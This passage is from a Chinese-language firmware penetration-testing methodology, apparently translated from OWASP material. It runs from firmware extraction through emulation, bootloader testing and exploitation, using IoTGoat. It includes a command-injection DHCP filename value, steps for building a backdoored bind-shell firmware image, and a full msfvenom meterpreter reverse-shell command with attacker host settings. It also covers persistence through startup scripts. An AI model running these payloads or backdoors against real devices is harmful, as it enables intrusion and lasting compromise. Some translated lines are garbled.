</h3></strong><h3>从板子上拆下flash芯片（例如SPI）或MCU，以进行离线分析和数据提取（LAST RESORT）。</h3><br /><strong><h3>· </h3></strong><h3>需要受支持的芯片编程器来存储flash和MCU。</h3><br /><h3>列出的每种方法的难度各不相同，根据项目目标和参与规则选择适当的方法。如果可能，需要拿到固件的调试版本和发布版本，以在发布版本中编译调试代码或功能时最大程度地覆盖测试用例。</h3><br /><strong><h3>0x03 分析固件</h3></strong><br /><h3>获取固件映像后，查看文件以识别其特征。使用以下步骤分析固件文件类型，root文件系统元数据，并进一步了解其编译平台。</h3><br /><h3>例如利用binutils</h3><a href="https://www.21ct.cc/">：</a><br /> file   <br /> strings  <br /> strings -n5   <br /> binwalk   <br /> hexdump -C -n 512  &gt; hexdump.out  <br /> hexdump -C  | head # might find signatures in header<br /><h3>如果以上方法均未提供有用的数据，则可能会发生以下情况：</h3><br /><strong><h3>· </h3></strong><h3>文件可能是BareMetal（没有配置文件系统）</h3><br /><strong><h3>· </h3></strong><h3>文件可能用于自定义文件系统的实时操作系统（RTOS）平台</h3><br /><strong><h3>· </h3></strong><h3>二文件可能已加密</h3><br /><h3>如果文件加密了，使用binwalk使用以下命令检查熵：</h3><br /> $ binwalk -E<br /><h3>低熵=不太可能被加密</h3><br /><h3>高熵=可能已加密（或以某种方式压缩）。</h3><br /><h3>也可以使用Binvis在线和应用程序。</h3><br /><strong><h3>· </h3></strong><h3>Binvis</h3><br /><strong><h3>· </h3></strong><a href="https://code.google.com/archive/p/binvis/">https://code.google.com/archive/p/binvis/</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://binvis.io/#/">https://binvis.io/#/</a><br /><strong><h3>0x04 提取文件系统</h3></strong><br /><h3>此阶段涉及查看固件内部并解析相关文件系统数据，以识别尽可能多的潜在安全问题。使用以下步骤提取固件内容，以检查以下阶段中使用的未编译代码和设备配置，自动和手动提取方法如下所示。</h3><br /><h3>1. 使用以下工具和方法来提取文件系统内容：</h3><br /> $ binwalk -ev<h3>文件将被提取到_binaryname/filesystemtype/</h3><br /><h3>文件系统类型：squashfs，ubifs，romfs，rootfs，jffs2，yaffs2，cramfs，initramfs</h3><br /><h3>有时，binwalk的签名中不会包含文件系统的Magic字节。在这些情况下，请使用binwalk查找文件系统的偏移量，然后从文件中分割压缩的文件系统，并使用以下步骤根据其类型手动提取文件系统。</h3><br /> $ binwalk DIR850L_REVB.bin<br /><h3>运行以下dd命令查看Squashfs文件系统。</h3><br /> dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs # or<br /><h3>也可以运行以下命令。</h3><br /> $ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs<br /><h3>在上面的示例中使用：</h3><br /> $ unsquashfs dir.squashfs<br /><h3>之后文件将位于squashfs-root目录中。</h3><br /><h3>CPIO存档文件：</h3><br /> $ cpio -ivd --no-absolute-filenames -F<br /><h3>jffs2文件系统</h3><a href="https://www.21ct.cc/">：</a><br /> $ jefferson rootfsfile.jffs2<br /><h3>对于具有NAND闪存的ubifs文件系统：</h3><br /> $ ubireader_extract_images -u UBI -s   $ ubidump.py<br /><strong><h3>0x05 分析文件系统</h3></strong><br /><h3>在此阶段，将收集有关动态和运行时分析阶段的线索。研究目标固件是否包含以下内容：</h3><br /><strong><h3>· </h3></strong><h3>传统的不安全网络守护程序，例如telnetd（有时会伪装重命名文件）</h3><br /><strong><h3>· </h3></strong><h3>硬编码的凭证（用户名，密码，API密钥，SSH密钥和后门变体）</h3><br /><strong><h3>· </h3></strong><h3>硬编码的API端点和后端服务器详细信息</h3><br /><strong><h3>· </h3></strong><h3>可用作入口点的服务器更新函数</h3><br /><strong><h3>· </h3></strong><h3>查看未编译的代码并启动脚本执行远程代码</h3><br /><strong><h3>· </h3></strong><h3>提取已编译的文件，以供使用反汇编程序进行脱机分析以供将来使用</h3><br /><h3>手动静态分析文件系统内容和未编译的代码，或利用诸如Firmwalker之类的自动化工具来分析以下内容：</h3><br /><strong><h3>· </h3></strong><h3>etc / shadow和etc / passwd</h3><br /><strong><h3>· </h3></strong><h3>列出etc / ssl目录</h3><br /><strong><h3>· </h3></strong><h3>搜索与SSL相关的文件，例如.pem，.crt等。</h3><br /><strong><h3>· </h3></strong><h3>搜索配置文件</h3><br /><strong><h3>· </h3></strong><h3>寻找脚本文件</h3><br /><strong><h3>·</h3></strong><h3> 搜索其他.bin文件</h3><br /><strong><h3>· </h3></strong><h3>查找诸如admin，password，remote，AWS key等关键字。</h3><br /><strong><h3>· </h3></strong><h3>搜索物联网设备上使用的通用Web服务器</h3><br /><strong><h3>· </h3></strong><h3>搜索常见的文件，例如ssh，tftp，dropbear等。</h3><br /><strong><h3>· </h3></strong><h3>搜索禁止的C函数</h3><br /><strong><h3>· </h3></strong><h3>搜索常见的命令注入易受攻击的函数</h3><br /><strong><h3>· </h3></strong><h3>搜索URL，电子邮件地址和IP地址</h3><br /><h3>以下小节介绍了开源自动固件分析工具。</h3><br /><a name="firmwalker工具使用"></a><strong><h3>Firmwalker工具</h3></strong><br /><h3>在〜/ tools / firmwalker的目录中执行firmwalker，并将firmwalker指向提取的文件系统根目录的绝对路径。Firmwalker使用“ / data /”目录中的信息来解析规则，可以在GitHub上的</h3><a href="https://github.com/scriptingxss/firmwalker">https://github.com/scriptingxss/firmwalker</a><h3>上找到由Aaron Guzman修改并带有其他检查的自定义版本。</h3><br /> https://github.com/OWASP/IoTGoat<br /> https://github.com/OWASP/IoTGoat<br /><h3>在</h3><a href="https://github.com/OWASP/IoTGoat">OWASP的IoTGoat</a><h3>上使用的firmwalker文件末尾的部分中列出了存在漏洞的固件。</h3><br /> $ ./firmwalker.sh /home/embedos/firmware/ _IoTGoat-rpi-2.img.extracted/squashfs-root/<h3>请参阅下面的firmwalker输出。</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzg3MjIwOTE5Mi5wbmc?x-oss-process=image/format,png"><img src="images\689-6.png" alt="images\689-6.png" /></a><br /><h3>将生成两个文件，firmwalker.txt和firmwalkerappsec.txt，这些输出文件需要手动检查。</h3><br /><a name="FACT使用"></a><strong><h3>固件分析工具包（FACT）</h3></strong><br /><h3>可以使用多种开源自动固件分析工具，FACT功能包括以下内容：</h3><br /><strong><h3>· </h3></strong><h3>标识软件组件（例如操作系统，CPU体系结构和第三方组件）及其关联的版本信息</h3><br /><strong><h3>· </h3></strong><h3>从映像中提取固件文件系统</h3><br /><strong><h3>· </h3></strong><h3>检测证书和私钥</h3><br /><strong><h3>· </h3></strong><h3>检测通用漏洞CWE</h3><br /><strong><h3>· </h3></strong><h3>基于签名的漏洞检测</h3><br /><strong><h3>· </h3></strong><h3>基本静态行为分析</h3><br /><strong><h3>· </h3></strong><h3>固件版本和文件差异比较</h3><br /><strong><h3>· </h3></strong><h3>使用QEMU的文件系统的用户模式仿真</h3><br /><strong><h3>· </h3></strong><h3>检测二进制缓解措施，例如NX，DEP，ASLR，stack canaries，RELRO和FORTIFY_SOURCE</h3><br /><strong><h3>· </h3></strong><h3>REST API</h3><br /><h3>以下是在配套的</h3><a href="https://tinyurl.com/EmbedOS-2019">虚拟机中</a><h3>使用固件分析比较工具包的说明。</h3><br /> https://tinyurl.com/EmbedOS-2019<br /> <br /> 建议使用具有16核64GB RAM的计算机运行FACT，尽管该工具可以至少4核和8GB RAM运行，但是非常慢；扫描输出结果取决于分配给虚拟机的资源。资源越多，FACT将完成扫描提交的速度越快。<br /> $ cd〜/ tools / FACT_core /<br /> $ sudo ./start_all_installed_fact_components<h3>在浏览器中导航到</h3><a href="http://127.0.0.1:5000/">http://127.0.0.1:5000</a><br /><h3> </h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzkyNjIwMTIxMy5wbmc?x-oss-process=image/format,png"><img src="images\689-7.png" alt="images\689-7.png" /></a><br /><h3>图片FACT</h3><br /><h3>将固件组件上传到FACT进行分析，在下面的截图中，带有root文件系统的完整固件将被上传和分析。</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzk2OTE4MTQ0Mi5wbmc?x-oss-process=image/format,png"><img src="images\689-8.png" alt="images\689-8.png" /></a><br /><h3>图片：FACT上传</h3><br /><h3>根据提供给FACT的硬件资源，分析结果将在给定时间随扫描结果一起显示。</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwODA0MDk2NDAxNi5wbmc?x-oss-process=image/format,png"><img src="images\689-9.png" alt="images\689-9.png" /></a><br /><h3>图片：FACT IoTGoat</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwODA5MjIwMjg0MC5wbmc?x-oss-process=image/format,png"><img src="images\689-10.png" alt="images\689-10.png" /></a><br /><h3>图片：FACT IoTGoat漏洞缓解措施</h3><br /><h3>使用IDA Pro，Ghidra，Hopper，Capstone或Binary Ninja从FACT收集的数据来分解可疑目标文件。分析文件以查找潜在的远程代码执行系统调用，字符串，函数列表，内存损坏漏洞，并标识对system（）或类似函数的外部调用。</h3><br /><h3>以下截图显示了使用Ghidra分析的“ shellback”文件。</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwODE3NzQzMTYwMS5wbmc?x-oss-process=image/format,png"><img src="images\689-11.png" alt="images\689-11.png" /></a><br /><h3>图片：Shellback Ghidra分析</h3><br /><br /><a name="固件二进制保护策略分析"></a><h3>常见的二进制分析包括以下内容：</h3><br /><strong><h3>· </h3></strong><h3>启用或禁用stack canaries</h3><br />◇ <code>$ readelf -aW bin/*| grep stack_chk_fail</code><br />◇ <code>$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail</code><br /><br /><strong><h3>· </h3></strong><h3>启用或禁用与位置无关的可执行文件（PIE）</h3><br />◇ PIE disabled<br />▪ <code>$ readelf -h &lt;bin&gt; | grep -q &#39;Type:[[:space:]]*EXEC&#39;</code><br />◇ PIE enabled<br />▪ <code>$ readelf -h &lt;bin&gt; | grep &#39;Type:[[:space:]]*DYN&#39;</code><br /><br />◇ DSO<br />▪ <code>$ readelf -d &lt;bin&gt; |  grep -q &#39;DEBUG&#39;</code><br /><br />◇ Symbols<br />▪ <code>$ readelf --syms &lt;bin&gt;</code><br />▪ <code>$ nm &lt;bin&gt;</code><br /><br /><br />• 可识别的字符串，即使用strings命令<br />◇ <code>-el</code> 指定16位宽的小端字符（例如UTF-16）. <br />◇ Use <code>-eb</code> for big endian<br />◇ Prints any ASCII strings longer than 16 to stdout<br />◇ The <code>-t</code> flag will return the offset of the string within the file. <br />◇ <code>-tx</code> will return it in hex format, T-to in octal and <code>-td</code> in decimal. <br />◇ Useful for cross-referencing with a hex editor, or want to know where in the file your string is.<br />◇ <code>strings -n5 &lt;bin&gt;</code><br />◇ <code>strings -el &lt;bin&gt;</code><br />◇ <code>strings -n16 &lt;bin&gt;</code><br />◇ <code>strings -tx &lt;bin&gt;</code><br /><br />• Non-executable (NX) enabled or disabled  E”表示堆栈是可执行的。<br />◇ <code>$ readelf -lW bin/&lt;bin&gt;| grep STACK</code><br /><code>GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</code><br /><br /><br />$ execstack bin/*<br />X bin/ash<br />X bin/busybox<br /><br />重定位只读（RELRO）配置<br /><strong><h3>· </h3></strong><h3>完整的RELRO</h3><br />- <code>$ readelf -d binary | grep BIND_NOW</code><br /><strong><h3>· </h3></strong><h3>部分RELRO</h3><br />- <code>$ readelf -d binary | grep GNU_RELRO</code><br /><br /><br /><h3>自动检查上述许多二进制属性的脚本是</h3><a href="https://github.com/slimm609/checksec.sh">checksec.sh</a><h3>。下面是使用脚本的两个示例。</h3><br /> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox<br /> <br /> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwODIyMTE1MzczMC5wbmc?x-oss-process=image/format,png"><img src="images\689-12.png" alt="images\689-12.png" /></a><br /><h3>图片：Checksec.sh</h3><br /><a name="固件仿真"></a><strong><h3>0x06 固件仿真</h3></strong><br /><h3>使用前面步骤中确定的详细信息和线索，需要模拟固件及其文件以验证潜在的漏洞。为了完成仿真固件，下面列出了几种方法。</h3><br /><h3>1. 部分仿真（用户空间）-仿真从固件提取的文件系统（例如）获得的/usr/bin/shellback独立文件</h3><br /><h3>2. 完整的系统仿真-完整的固件仿真和利用伪造的NVRAM启动配置。</h3><br /><h3>3. 使用真实设备或虚拟机进行仿真-有时，由于硬件或体系结构的依赖性，部分或全部仿真可能无法正常工作。如果架构和字节序与拥有的设备（例如树莓派）匹配，则可以将根文件系统或特定文件传输到该设备以进行进一步测试。此方法还适用于使用与目标相同的体系结构和字节序的Build虚拟机。</h3><br /><strong><h3>用户模式仿真</h3></strong><br /><h3>要开始部分仿真文件，必须了解CPU架构和字节序，以便在以下步骤中选择适当的QEMU仿真文件。</h3><br /> $ binwalk -Y  <br /> $ readelf -h<br /><h3>el 代表： little endian ，eb 代表：big endian</h3><br /><h3>可使用以下命令，使用Binwalk识别打包的固件文件（不是来自提取的固件中的文件）的字节序。</h3><br /> $ binwalk -Y UPG_ipc8120p-w7-M20-hi3516c-20160328_165229.ov<br /> <br /> 十进制十六进制描述<br /> -------------------------------------------------- ------------------------------<br /> 3480 0xD98 ARM可执行代码，32位，小端字节序。<br /><h3>确定了CPU的体系结构和字节序后，找到适当的QEMU文件以执行部分仿真（不是用于仿真完整的固件，而是用于提取固件的文件。）</h3><br /> /usr/local/qemu-arch` 或者 `/usr/bin/qemu-arch<br /><h3>将适用的QEMU文件复制到提取的根文件系统中。第二个命令显示将静态QEMU文件复制到ZSH shell中的提取的根文件系统，该文件会显示绝对路径。</h3><br /> &gt; cp / usr / local / qemu-arch / extractedrootFS / /home/embedos/firmware/_DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted.extracted/squashfs-root <br /> &gt; cp / usr / bin / qemu-arm-static .<br /><h3>执行ARM文件（或适当的体系结构）以使用QEMU和chroot通过以下命令进行仿真：</h3><br /> $ sudo chroot . ./qemu-arch<br /><h3>以下示例显示在攻击者计算机可能使用的典型x64体系结构中模拟的Busybox。</h3><br /> &gt; sudo chroot. ./qemu-arm-static bin / busybox ls<br /> embedos[sudo]password： <br /> bin rom sys var<br /> dev lib proc root tmp www<br /> dnsmasq_setup.sh mnt qemu-arm-static sbin usr<br /><h3>下面是模拟在端口5515上侦听服务的示例。</h3><br /> &gt; sudo chroot. ./qemu-arm-static usr / bin / shellback<br /><h3>在另一个终端中，检查服务是否在本地侦听，然后尝试连接到该服务。</h3><br /> sudo lsof -i:5515<br /> nc -nv 127.0.0.1 5515<br /> <br /> sudo chroot . ./qemu-mips-static -E REQUEST_METHOD=&quot;POST&quot; -E REQUEST_URI= -E REMOTE_ADDR= -E HTTP_COOKIE= -g<br /><h3>模拟目标文件后，与其解释器或侦听服务进行交互，Fuzz其应用程序和网络接口。</h3><br /><strong><h3>全系统仿真</h3></strong><br /><h3>使用Firmadyne固件分析工具包或ARM-X固件仿真框架等自动化工具来执行固件的完整仿真。这些工具实质上是QEMU和其他环境功能（例如nvram）的包装器。</h3><br /><strong><h3>· </h3></strong><a href="https://github.com/attify/firmware-analysis-toolkit">https://github.com/attify/firmware-analysis-toolkit</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/therealsaumil/armx/">https://github.com/therealsaumil/armx/</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/firmadyne/firmadyne">https://github.com/firmadyne/firmadyne</a><br /><h3>使用固件分析工具包，只需执行以下命令：</h3><br /> sudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0 <br /> <br />                                __ _<br />                               / _ | | |<br />                              | | _ __ _ | | _<br />                              | _ | / _ | | | __ |<br />                              | | | （_ | | | | _<br />                              | _ | \ __，_ | \ __ |<br /> <br />               <br /> BusyBox v1.28.4（）shell（ash）<br /> <br />                                                            .--，\\\ __         <br /> ██████╗██╗██╗█████╗███████████████╗`-。a` -.__    <br /> ██╔═══██╗██║██║██╔══██╗██╔════╝██╔══██╗| &#39;）   <br /> ██║██║██║█╗██║███████║███████████████╔╝/ \ _.-&#39;-，`；    <br /> ██║██║██║███╗██║██╔══██║╚════██║██╔═══╝/ | {/    <br /> ██████╔╝╚███╔███╔╝██║██║███████║██║/ | {/    <br /> ╚═╝╚══════╝╚═╝..-“``〜”-&#39;; ）     <br />                                            ╦┌─┐╔╦╗╔═╗┌─┐┌─┐┌┬┐;&#39; `     <br />                                            ║││║╦││├─┤│;&#39; `      <br />                                            &#39;─┘┴┴;&#39; `       <br />  -------------------------------------------------- ----------;&#39;             <br />  GitHub：https://github.com/OWASP/IoTGoat                                                <br />  -------------------------------------------------- ----------   <br /> root @ IoTGoat：/＃<br /><h3>如果固件包含不常见的压缩，文件系统或不支持的体系结构，则可能需要修改这些工具。</h3><br /><strong><h3>0x07 动态分析</h3></strong><br /><h3>在此阶段，请在设备在其正常或仿真环境中运行时执行动态测试。此阶段的目标可能会因项目和访问级别而异。通常，涉及修改引导程序配置，Web和API测试，Fuzz（网络和应用程序服务），以及使用各种工具集进行主动扫描以获取root访问权限或代码执行。</h3><br /><h3>可能用到的工具：</h3><br /><strong><h3>· </h3></strong><h3>Burp Suite</h3><br /><strong><h3>· </h3></strong><h3>OWASP ZAP</h3><br /><strong><h3>· </h3></strong><h3>Commix</h3><br /><strong><h3>· </h3></strong><h3>Fuzzers such as - American fuzzy loop (AFL)、</h3><br /><strong><h3>· </h3></strong><h3>Network and protocol fuzzers such as – </h3><a href="https://github.com/Cisco-Talos/mutiny-fuzzer">Mutiny</a><h3>, </h3><a href="https://github.com/jtpereyda/boofuzz">boofuzz</a><h3>, and </h3><a href="https://github.com/cisco-sas/kitty">kitty</a><br /><strong><h3>· </h3></strong><h3>Nmap</h3><br /><strong><h3>· </h3></strong><h3>NCrack</h3><br /><strong><h3>· </h3></strong><h3>metasploit</h3><br /><strong><h3>Web应用测试</h3></strong><br /><h3>以下是嵌入式设备的Web应用程序中要检查的特定区域：</h3><br /><strong><h3>· </h3></strong><h3>诊断和故障排除页面可能存在命令注入</h3><br /><strong><h3>· </h3></strong><h3>验证和授权方案对整个固件中的应用程序和操作系统平台的相同框架进行验证</h3><br /><strong><h3>· </h3></strong><h3>默认的用户名、密码</h3><br /><strong><h3>· </h3></strong><h3>在网页执行目录遍历或文件读取，以识别调试或测试功能</h3><br /><strong><h3>· </h3></strong><h3>在 SOAP/xml 和 API 传输中的输入检查 ，如：XSS 和 XXE</h3><br /><strong><h3>· </h3></strong><h3>跟踪观察应用程序中的参数查看异常点和堆栈溢出点</h3><br /><strong><h3>· </h3></strong><h3>针对常见的C / C ++漏洞针对嵌入式Web应用程序服务量身定做目标payload，例如内存损坏漏洞，格式字符串漏洞和整数溢出。</h3><br /><h3>根据产品及其应用程序界面的不同，测试用例也会有所不同。</h3><br /><strong><h3>引导加载程序测试</h3></strong><br /><h3>修改设备启动和引导加载程序（例如U-boot）时，请尝试以下操作：</h3><br /><strong><h3>· </h3></strong><h3>尝试在引导过程中按“ 0”，空格或其他标识的“Magic code”来访问引导程序解释器shell。</h3><br /><strong><h3>· </h3></strong><h3>修改配置以执行shell命令，例如在引导参数末尾添加&#39; &#39;init=/bin/sh</h3><br /><strong><h3>· </h3></strong><h3>#printenv</h3><br /><strong><h3>· </h3></strong><h3>#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3</h3><br /><strong><h3>· </h3></strong><h3>mtdparts=sflash:</h3>（此处可能有问题，需要查看官方译文）<br /><strong><h3>· </h3></strong><h3>#saveenv</h3><br /><strong><h3>· </h3></strong><h3>#boot</h3><br /><strong><h3>· </h3></strong><h3>设置一个tftp服务器，从工作站本地通过网络加载，确保设备具有网络访问权限。  </h3><br /><strong><h3>· </h3></strong><h3>#setenv ipaddr 192.168.2.2 #local IP of the device</h3><br /><strong><h3>· </h3></strong><h3>#setenv serverip 192.168.2.1 #tftp server IP</h3><br /><strong><h3>· </h3></strong><h3>#saveenv</h3><br /><strong><h3>· </h3></strong><h3>#reset</h3><br /><strong><h3>· </h3></strong><h3>#ping 192.168.2.1 #check if network access is available</h3><br /><strong><h3>· </h3></strong><h3>#tftp ${loadaddr} uImage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the TFTP server</h3><br /><br /><strong><h3>· </h3></strong><h3>使用 ubootwrite.py 编写 uboot-image 并且安装修改过的固件来获取 root</h3><br /><a href="https://github.com/HorstBaerbel/ubootwrite">https://github.com/HorstBaerbel/ubootwrite</a><br /><strong><h3>· </h3></strong><h3>检查启用的调试功能，例如</h3><a href="https://www.21ct.cc/">：</a><br /><strong><h3>· </h3></strong><h3>详细记录</h3><br /><strong><h3>· </h3></strong><h3>加载任意内核</h3><br /><strong><h3>· </h3></strong><h3>从不受信任的来源引导  </h3><br /><strong><h3>· </h3></strong><h3>使用警告：将一个引脚接地，观察设备启动顺序，在内核解压缩之前，将接地引脚短路/连接到SPI闪存芯片上的数据引脚（DO）</h3><br /><strong><h3>· </h3></strong><h3>将一个引脚接地，观察设备启动顺序，在内核解压缩之前，在U-boot对UBI映像解压缩时，将接地引脚短路/连接至NAND闪存芯片的引脚8和9。</h3><br /><strong><h3>· </h3></strong><h3>在短接引脚之前请查看NAND闪存芯片的数据表</h3><br /><strong><h3>· </h3></strong><h3>使用恶意参数配置恶意DHCP服务器作为设备在PXE引导期间提取的输入</h3><br /><strong><h3>· </h3></strong><h3>使用Metasploit（MSF）DHCP辅助服务器，并使用命令注入命令修改FILENAME``‘a&quot;;/bin/sh;#’参数，例如测试设备启动过程的输入验证。</h3><br /><strong><h3>固件完整性测试</h3></strong><br /><h3>尝试上传自定义固件和编译的文件，以检查完整性或签名验证漏洞。例如，使用以下步骤编译在启动时启动的后门绑定shell。</h3><br /><h3>1. 使用固件修改包（FMK）提取固件；</h3><br /><h3>2. 确定目标固件架构和字节序；</h3><br /><h3>3. 使用BuildrootBuild交叉编译器或使用适合环境的其他方法；</h3><br /><h3>4. 使用交叉编译器Build后门；</h3><br /><h3>5. 将后门复制到解压缩的固件/ usr / bin中；</h3><br /><h3>6. 将适当的QEMU文件复制到提取的固件rootfs；</h3><br /><h3>7. 使用chroot和QEMU模拟后门；</h3><br /><h3>8. 通过netcat连接到后门；</h3><br /><h3>9. 从提取的固件rootfs中删除QEMU文件；</h3><br /><h3>10. 用FMK重新包装修改后的固件；</h3><br /><h3>11. 通过使用固件分析工具包（FAT）进行仿真并使用netcat连接到目标后门IP和端口来测试后门固件。</h3><br /><h3>如果已经通过动态分析，引导加载程序操纵或硬件安全测试手段获得了root shell，尝试执行预编译的恶意文件，例如植入程序或反向shell。使用用于命令和控制（C＆C）框架的自动化有效载荷/植入工具。例如，可以使用以下步骤来利用Metasploit框架和msfvenom。</h3><br /><h3>1. 确定目标固件架构和字节序</h3><br /><h3>2. 使用指定适当的目标负载（-p），攻击者主机IP（LHOST =），侦听端口号（LPORT =）文件类型（-f），编译（--arch），平台（--platform Linux或Windows）和输出文件（-o）。例如，msfvenom``msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux</h3><br /><h3>3. 将有效负载传到受感染的设备（例如，运行本地Web服务器，并将有效负载wget / curl到文件系统），并确保有效负载具有执行权限</h3><br /><h3>4. 准备Metasploit以处理传入的请求。例如，使用msfconsole启动Metasploit，然后根据上述有效负载使用以下设置：use exploit / multi / handler，</h3><br /><strong><h3>· </h3></strong><h3>set payload linux/armle/meterpreter_reverse_tcp</h3><br /><strong><h3>· </h3></strong><h3>set LHOST 192.168.1.245 #attacker host IP</h3><br /><strong><h3>· </h3></strong><h3>set LPORT 445 #can be any unused port</h3><br /><strong><h3>· </h3></strong><h3>set ExitOnSession false</h3><br /><strong><h3>· </h3></strong><h3>exploit -j -z</h3><br /><strong><h3>· </h3></strong><h3>在受感染的设备上执行meterpreter反向shell</h3><br /><strong><h3>· </h3></strong><h3>查看 meterpreter sessions</h3><br /><strong><h3>· </h3></strong><h3>后渗透攻击</h3><br /><h3>最后，尽可能的在启动脚本中设置对设备持久访问的后门，保证重新启动后也有设备的访问控制权</h3><br /><strong><h3>0x08 运行时分析</h3></strong><br /><h3>运行时分析涉及在设备在其正常或仿真环境中运行时附加到正在运行的进程或文件。下面提供了基本的运行时分析步骤：</h3><br /><h3>1. sudo chroot . ./qemu-arch -L。</h3><br /><h3>2. 附加gdb-multiarch或使用IDA模拟文件。</h3><br /><h3>3. 为步骤4中识别的函数设置断点，例如memcpy，strncpy，strcmp等。</h3><br /><h3>4. 使用Fuzzer执行较大的payload字符串挖掘溢出或进程崩溃。</h3><br /><h3>5. 如果发现漏洞，请移至步骤8。</h3><br /><h3>会用到的工具：</h3><br /><strong><h3>· </h3></strong><h3>gdb-multiarch</h3><br /><strong><h3>· </h3></strong><a href="https://github.com/longld/peda">Peda</a><br /><strong><h3>· </h3></strong><h3>Frida</h3><br /><strong><h3>· </h3></strong><h3>ptrace</h3><br /><strong><h3>· </h3></strong><h3>strace</h3><br /><strong><h3>· </h3></strong><h3>IDA Pro</h3><br /><strong><h3>· </h3></strong><h3>Ghidra</h3><br /><strong><h3>· </h3></strong><h3>Binary Ninja</h3><br /><strong><h3>· </h3></strong><h3>Hopper</h3><br /><strong><h3>0x09 漏洞利用</h3></strong><br /><h3>在从之前的步骤中识别出文件中的漏洞之后，需要适当的概念验证（PoC）来证明现实的影响和风险。开发漏洞利用代码需要具有较低级语言（例如ASM，C / C ++，shellcode等）的编程经验，以及特定目标体系结构（例如MIPS，ARM，x86等）中的背景知识，PoC代码涉及通过控制内存中的指令在设备或应用程序上获得任意执行。</h3><br /><h3>在嵌入式系统中通常不存在二进制运行时保护（例如NX，DEP，ASLR等），需要ROP技术来绕过。ROP允许攻击者通过链接目标进程/二进制代码（称为gadget）中的现有代码来实施任意恶意功能，需要采取步骤来利用已识别的漏洞，例如通过形成ROP链来利用缓冲区溢出漏洞。</h3><br /><h3>可以使用Capstone的gadget查找器或ROPGadget- </h3><strong><h3>· </h3></strong><a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a><h3>：</h3><br /><strong><h3>· </h3></strong><a href="https://azeria-labs.com/writing-arm-shellcode/">https://azeria-labs.com/writing-arm-shellcode/</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/</a><br /><strong><h3>0x10 固件分析工具</h3></strong><br /><h3>下面列出的是常用工具：</h3><br /><strong><h3>· </h3></strong><a href="https://github.com/fkie-cad/FACT_core">固件分析比较工具包</a><h3>（FACT）</h3><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/cruise-automation/fwanalyzer">FWanalyzer</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/craigz28/firmwalker">Firmwalker</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://code.google.com/archive/p/firmware-mod-kit/">firmware-mod-kit</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/firmadyne/firmadyne">Firmadyne</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://gitlab.com/bytesweep/bytesweep">ByteSweep</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="http://binwalk.org/">Binwalk</a><br /><strong><h3>· </h3></strong><a href="https://www.flashrom.org/Flashrom">FLASHROM</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="http://openocd.org/">openocd</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/angr/angr">angr</a><br /><strong><h3>· </h3></strong><a href="http://www.binaryanalysis.org/en/home">binaryanalysis</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/slimm609/checksec.sh">Checksec.sh</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/chipsec/chipsec">CHIPSEC</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/qilingframework/qiling">qilingframework模拟框架</a><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://triton.quarkslab.com/">triton框架</a><br /><strong><h3>0x11  固件靶机</h3></strong><br /><h3>用于练习的固件漏洞项目</h3><br /><strong><h3>·</h3></strong><h3> OWASP IoTGoat</h3><br /><strong><h3>· </h3></strong><a 